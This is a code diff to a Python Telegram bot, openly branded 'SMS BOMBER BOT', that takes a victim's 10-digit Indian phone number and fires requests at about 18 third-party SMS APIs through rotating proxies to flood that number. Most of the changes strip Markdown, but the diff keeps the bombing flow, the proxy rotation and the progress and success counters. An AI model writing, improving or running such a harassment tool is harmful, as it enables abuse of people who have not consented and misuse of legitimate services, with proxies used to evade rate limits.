@@ -28,12 +28,9 @@ PROXIES = [
     {'http': 'http://103.152.112.120:80'},
     {'http': 'http://103.152.112.162:80'},
     {'http': 'http://103.152.112.193:80'},
-    {'http': 'http://103.152.112.120:80'},
-    {'http': 'http://103.152.112.162:80'},
 ]
 
 def get_proxy():
-    """Get random proxy"""
     return random.choice(PROXIES)
 
 # --- Database ---
@@ -472,20 +469,13 @@ def send_sms(api_data):
                     proxies=proxy
                 )
         
-        # Check if successful
         if response.status_code in [200, 201, 202, 204]:
             return True
-        
-        # Retry without proxy if failed
-        if response.status_code in [403, 429]:
-            time.sleep(1)
-            return False
-            
         return False
     except:
         return False
 
-# --- Telegram Bot Handlers ---
+# --- Telegram Bot Handlers (NO MARKDOWN) ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start command"""
@@ -505,14 +495,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🔥 *SMS BOMBER BOT* 🔥\n\n"
+        "🔥 SMS BOMBER BOT 🔥\n\n"
         "📌 Send any 10-digit number to start bombing\n"
-        "Example: `9876543210`\n\n"
-        "⚡ *18+ Working APIs*\n"
-        "⚡ *Real SMS Bombing*\n"
-        "⚡ *Proxy Supported*\n\n"
+        "Example: 9876543210\n\n"
+        "⚡ 18+ Working APIs\n"
+        "⚡ Real SMS Bombing\n"
+        "⚡ Proxy Supported\n\n"
         "💀 @BeStChEaT_OwNeR",
-        parse_mode='Markdown',
         reply_markup=reply_markup
     )
 
@@ -529,20 +518,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if valid phone number
     if not re.match(r'^[0-9]{10}$', phone):
         await update.message.reply_text(
-            "❌ *Invalid Number!*\n\n"
+            "❌ Invalid Number!\n\n"
             "Send 10-digit number only.\n"
-            "Example: `9876543210`",
-            parse_mode='Markdown'
+            "Example: 9876543210"
         )
         return
     
     # Start bombing
     msg = await update.message.reply_text(
-        f"📱 *BOMBING STARTED!*\n\n"
-        f"🎯 Target: `+91{phone}`\n"
+        f"📱 BOMBING STARTED!\n\n"
+        f"🎯 Target: +91{phone}\n"
         f"⏳ Sending SMS with Proxy...\n\n"
-        f"💀 @BeStChEaT_OwNeR",
-        parse_mode='Markdown'
+        f"💀 @BeStChEaT_OwNeR"
     )
     
     apis = get_apis(phone)
@@ -565,21 +552,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             progress = int(((i + 1) / len(apis)) * 100)
             try:
                 await msg.edit_text(
-                    f"📱 *BOMBING IN PROGRESS*\n\n"
-                    f"🎯 Target: `+91{phone}`\n"
+                    f"📱 BOMBING IN PROGRESS\n\n"
+                    f"🎯 Target: +91{phone}\n"
                     f"✅ Success: {success}\n"
                     f"❌ Failed: {failed}\n"
                     f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
-                    f"💀 @BeStChEaT_OwNeR",
-                    parse_mode='Markdown'
+                    f"💀 @BeStChEaT_OwNeR"
                 )
             except:
                 pass
     
     # Final result
     result = (
-        f"✅ *BOMBING COMPLETE!*\n\n"
-        f"📞 Target: `+91{phone}`\n"
+        f"✅ BOMBING COMPLETE!\n\n"
+        f"📞 Target: +91{phone}\n"
         f"📨 Total: {len(apis)}\n"
         f"✅ Success: {success}\n"
         f"❌ Failed: {failed}\n\n"
@@ -587,11 +573,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if services:
         unique_services = list(dict.fromkeys(services))
-        result += f"🟢 *Services:* {', '.join(unique_services[:8])}\n\n"
+        result += f"🟢 Services: {', '.join(unique_services[:8])}\n\n"
     
     result += f"💀 @BeStChEaT_OwNeR"
     
-    await msg.edit_text(result, parse_mode='Markdown')
+    await msg.edit_text(result)
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle button callbacks"""
@@ -600,23 +586,21 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if query.data == "send_number":
         await query.edit_message_text(
-            "📞 *SEND NUMBER*\n\n"
+            "📞 SEND NUMBER\n\n"
             "Send your 10-digit number.\n"
-            "Example: `9876543210`\n\n"
-            "💀 @BeStChEaT_OwNeR",
-            parse_mode='Markdown'
+            "Example: 9876543210\n\n"
+            "💀 @BeStChEaT_OwNeR"
         )
     
     elif query.data == "about":
         await query.edit_message_text(
-            "ℹ️ *ABOUT*\n\n"
+            "ℹ️ ABOUT\n\n"
             "🤖 SMS Bomber Bot\n"
             "👨‍💻 @BeStChEaT_OwNeR\n"
             "📊 18+ APIs\n"
             "⚡ Real SMS Bombing\n"
             "🔄 Proxy Support\n\n"
-            "💀 @BeStChEaT_OwNeR",
-            parse_mode='Markdown'
+            "💀 @BeStChEaT_OwNeR"
         )
     
     elif query.data == "status":
@@ -625,14 +609,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         blocked_users = len(db['blocked'])
         
         await query.edit_message_text(
-            f"📊 *BOT STATUS*\n\n"
+            f"📊 BOT STATUS\n\n"
             f"👥 Users: {total_users}\n"
             f"🚫 Blocked: {blocked_users}\n"
             f"📡 Status: Online\n"
             f"🔄 Proxy: Active\n"
             f"⚡ APIs: 18\n\n"
-            f"💀 @BeStChEaT_OwNeR",
-            parse_mode='Markdown'
+            f"💀 @BeStChEaT_OwNeR"
         )
 
 # --- Owner Commands ---
@@ -694,13 +677,12 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     blocked_users = len(db['blocked'])
     
     await update.message.reply_text(
-        f"📊 *BOT STATISTICS*\n\n"
+        f"📊 BOT STATISTICS\n\n"
         f"👥 Total Users: {total_users}\n"
         f"🚫 Blocked Users: {blocked_users}\n"
         f"📡 Status: Online\n"
         f"🔄 Proxy: Active\n\n"
-        f"💀 @BeStChEaT_OwNeR",
-        parse_mode='Markdown'
+        f"💀 @BeStChEaT_OwNeR"
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -709,7 +691,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if user_id == OWNER_ID:
         text = (
-            "👑 *OWNER COMMANDS*\n\n"
+            "👑 OWNER COMMANDS\n\n"
             "/block USER_ID - Block user\n"
             "/unblock USER_ID - Unblock user\n"
             "/stats - Bot statistics\n\n"
@@ -717,13 +699,13 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         text = (
-            "🤖 *USER COMMANDS*\n\n"
+            "🤖 USER COMMANDS\n\n"
             "/start - Start bot\n"
             "9876543210 - Send number to bomb\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
-    await update.message.reply_text(text, parse_mode='Markdown')
+    await update.message.reply_text(text)
 
 # --- Main Bot ---
 
